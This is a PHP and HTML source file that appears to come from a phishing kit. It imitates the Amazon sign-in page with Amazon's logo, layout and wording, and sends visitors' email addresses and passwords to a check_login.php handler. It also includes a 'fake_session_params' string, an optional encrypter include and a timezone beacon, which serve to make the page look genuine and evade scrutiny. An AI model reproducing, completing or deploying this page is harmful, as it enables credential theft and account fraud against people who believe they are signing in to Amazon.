<?php
error_reporting(0);
@ob_start();
session_start();
if(!isset($_SESSION['SESSION_ID']))
{
	header("location: index.php");
	exit;
}

include_once 'inc/config.php';
include_once 'inc/functions.php';

$_GET = array();
  $params = explode('&', $_SERVER['QUERY_STRING']);
  foreach ($params as $pair) {
    list($key, $value) = explode('=', $pair);
    $_GET[urldecode($key)] = urldecode($value);
}
$session = isset($_GET['session']) ? $_GET['session'] : '';
$fake_session_params = "login.php?auth=1&header=1&session=".$session;

if(!isset($_SESSION['LANG'])) {
	if($dynamic_language) {
		$_SESSION['LANG'] = getBrowserLanguage(substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2));
	} else {
		$_SESSION['LANG'] = $default_language.'.php';
	}
}

require_once 'languages/'.$_SESSION['LANG'];
?>


<!DOCTYPE HTML>
<html>
<head>
<?php 
if($enable_encrypter) {
	require_once 'inc/encrypter.php'; 
}
?>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
<meta charset="utf-8">
<title dir="ltr"><?php echo $lang['PAGE_TITLE']; ?></title>
    
<script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
<script type="text/javascript">
$(document).ready(function() { 
  jQuery.ajax({
    url: 'timezone.php' + '?time=' + new Date(),
    success: function (result) {
      //
    },
    async: false
  });
});
</script>      
    
  
<link rel="shortcut icon" href="assets/imgs/favicon.ico">
<link media="all" href="assets/css/style.css" type="text/css" rel="stylesheet">
</head>
<body class="ap-locale-en_US a-auix_ux_57388-t1 a-auix_ux_63571-c a-aui_51744-c a-aui_57326-c a-aui_58736-c a-aui_accessibility_49860-c a-aui_attr_validations_1_51371-c a-aui_bolt_62845-c a-aui_ux_49594-c a-aui_ux_56217-c a-aui_ux_59374-c a-aui_ux_60000-c a-meter-animate">


<div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none">
        



<div class="a-section a-spacing-medium a-text-center">
  
    
    
      <a class="a-link-nav-icon" tabindex="-1" href="#">

        
          
            <i class="a-icon a-icon-logo" aria-label="Amazon"><span class="a-icon-alt">Amazon</span></i>
          
        
        
      </a>
    
  
</div>


      </div>

      <div class="a-section auth-pagelet-container a-spacing-base">
          <?php 

          	if(isset($_GET['error']) && $_GET['error'] === 'true') {
          		$error_message = '<div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">'.$lang['LOGIN_ERROR_TOP'].'</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">';
      				$error_message .=  '<ul class="a-nostyle a-vertical a-spacing-none">';
      				$error_message .=  '<li><span class="a-list-item">';
      				$error_message .=   $lang['LOGIN_ERROR'];
      				$error_message .= '</span></li></ul> </div></div></div>';
      				echo $error_message;
          	}
          ?>
        
      </div>

      <div class="a-section">
        


<div class="a-section a-spacing-base auth-pagelet-container">
  <div class="a-section">
    
    <form  method="post" action="check_login.php?<?php echo $_SESSION['SESSION_ID']; ?>" class="auth-validate-form auth-real-time-validation a-spacing-none fwcim-form">
      

      <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h1 class="a-spacing-small">
            <?php echo $lang['SIGN_IN_TITLE']; ?>
          </h1>
          
          <div class="a-row a-spacing-base">
            <label for="ap_email">
              <?php echo $lang['EMAIL']; ?>
            </label>
            
              
            
            <input maxlength="128" id="ap_email" name="email" tabindex="1"  class="a-input-text a-span12 auth-autofocus auth-required-field" type="email"value="<?php echo isset($_SESSION['LoginId']) ? $_SESSION['LoginId'] : ''; ?>">
            


<div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-none a-spacing-top-mini"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
  Enter your email
</div></div></div>

          </div>

          


<div class="a-section a-spacing-large">
  <div class="a-row">
    <div class="a-column a-span5">
      <label for="ap_password">
        <?php echo $lang['PASSWORD']; ?>
      </label>
    </div>

    
    
 <div class="a-column a-span7 a-text-right a-span-last">
        


<a id="auth-fpp-link-bottom" class="a-spacing-null a-link-normal" href="#">
  <?php echo $lang['FORGOT_PASSWORD']; ?>
</a>
      </div>
    
  </div>
  
  
  <input id="ap_password" name="password" tabindex="2" class="a-input-text a-span12 auth-required-field" type="password">

  


<div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-none a-spacing-top-mini"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
  Enter your password
</div></div></div>
  
</div>

          <div class="a-section a-spacing-extra-large">
            
            
            <span class="a-button a-button-span12 a-button-primary" id="a-autoid-0"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" aria-labelledby="a-autoid-0-announce" type="submit"><span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce">
              <?php echo $lang['SIGN_IN_BUTTON']; ?>
            </span></span></span>

            

  <div class="a-row a-spacing-top-medium">
    <div class="a-section a-text-left">
      <label for="auth-remember-me">
        <div data-a-input-name="rememberMe" class="a-checkbox"><label><input name="rememberMe" value="true" tabindex="4" type="checkbox"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
          <?php echo $lang['KEEP_ME_SIGNED_IN']; ?>
          
            <span class="a-declarative" data-action="auth-popup" data-auth-popup="{&quot;windowOptions&quot;:&quot;width=700, height=500, resizable=1, scrollbars=1, toolbar=1, status=1&quot;,&quot;targetWindow&quot;:&quot;_blank&quot;}">
            </span>
          
        </span></label></div>
      </label>
    </div>
  </div>

          </div>
          
                
                <div class="a-divider a-divider-break"><h5><?php echo $lang['NEW_TO_AMAZON']; ?></h5></div>
                <span id="auth-create-account-link" class="a-button a-button-span12"><span class="a-button-inner"><a id="createAccountSubmit" tabindex="6" href="#" class="a-button-text" role="button">
                  <?php echo $lang['CREATE_YOUR_AMAZON_ACCOUNT']; ?>
                </a></span></span>
              
          
                   
        </div></div>
      </div>
  </div>
</div>


      </div>

      
      <div id="right-2">
      </div>
      
      <div class="a-section a-spacing-top-extra-large">
        


<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>
<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>
  
    
    <a class="a-link-normal" target="_top" href="#">
      <?php echo $lang['TERMS_OF_USE']; ?>
    </a>
    <span class="auth-footer-seperator"></span>
  
    
    <a class="a-link-normal" target="_top" href="#">
      <?php echo $lang['PRIVACY_POLICY']; ?>
    </a>
    <span class="auth-footer-seperator"></span>
  
    
    <a class="a-link-normal" target="_top" href="#">
      Help
    </a>
    <span class="auth-footer-seperator"></span>
  
</div>

<div class="a-section a-spacing-none a-text-center">
  <span class="a-size-mini a-color-secondary">
    <?php echo $lang['COPYRIGHT']; ?>
  </span>
</div>

      </div>
    </div>

    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
    </div>


</body>
</html>
<?php ob_end_flush(); ?>
